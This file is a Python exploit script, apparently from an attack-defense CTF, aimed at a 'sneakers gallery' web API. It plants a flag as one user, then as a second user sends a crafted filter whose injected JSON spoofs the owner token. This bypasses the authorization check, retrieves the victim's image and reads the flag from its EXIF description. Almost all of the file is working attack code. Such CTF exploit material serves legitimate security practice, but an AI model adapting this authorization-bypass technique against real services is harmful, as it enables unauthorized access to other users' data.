import sys
import uuid
from io import BytesIO
from uuid import uuid4

import piexif
import requests
from PIL import Image


def main():
    client = Client(IP)
    FLAG = f"{uuid4()}"

    # region prepare

    secret_artist = client.create_artist(uuid4(), "some_name")
    barhatnye_tyagi = client.create_sneakers(FLAG, secret_artist["token"]["value"])

    # endregion

    public_id = barhatnye_tyagi["id"]["value"]

    hacker = client.create_artist(uuid4(), "hacker_name")
    hacker_token = hacker["token"]["value"]

    content = "{" + "\"OwnerToken\": " + "{" + f"\"Value\":\"{hacker_token}\"" + "}" + "}"
    filter_payload = {"Type": "-100500", "JsonString": content}

    hacker_filters = [filter_payload, filter_payload]
    ids_to_show = [{"Value": public_id}]
    exhibits_with_secret = client.gallery_exhibits(hacker_filters, ids_to_show, hacker_token)

    download_token = exhibits_with_secret["items"][0]["downloadToken"]["value"]
    barhatnye_tyagi_content = client.gallery_show(download_token)

    potential_flag = extract_description(barhatnye_tyagi_content)
    if potential_flag == FLAG:
        print(f"CONGRATS! Your reached the flag: {potential_flag}")
    else:
        raise Exception("smth went wrong :(")


def extract_description(image_content_bytes) -> str:
    image = Image.open(BytesIO(image_content_bytes))

    exif_dict = piexif.load(image.info["exif"])

    if "0th" not in exif_dict:
        return ""

    flag = exif_dict["0th"][piexif.ImageIFD.ImageDescription]
    return str(flag, 'utf-8')


class Client:
    def __init__(self, host, port=7777):
        self.api_prefix = f"http://{host}:{port}"

    def create_artist(self, artist_id: uuid.UUID, name: str):
        resp = requests.post(
            f"{self.api_prefix}/artist",
            json={"Id": {"Value": f"{artist_id}"}, "Name": name})

        return resp.json()

    def create_sneakers(self, flag: str, artist_token: uuid.UUID):
        resp = requests.post(
            f"{self.api_prefix}/sneakers/masterpiece",
            json={"Collection": "Velvet", "Description": flag},
            headers={"Authorization": f"{artist_token}"})

        return resp.json()

    def gallery_exhibits(self, filters: list, ids_to_search: list, artist_token: uuid.UUID):
        resp = requests.post(
            f"{self.api_prefix}/gallery/exhibits",
            json={"Conditions": filters, "IdsToSearch": ids_to_search},
            headers={"Authorization": f"{artist_token}"})

        return resp.json()

    def gallery_show(self, download_token: str):
        resp = requests.get(f"{self.api_prefix}/gallery/show/{download_token}")

        return resp.content


def iterative_main():
    for i in range(0, 1):
        main()
        print()


IP = sys.argv[1] if len(sys.argv) > 1 else None
FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else None

if __name__ == '__main__':
    if IP is None:
        IP = "localhost"
    iterative_main()
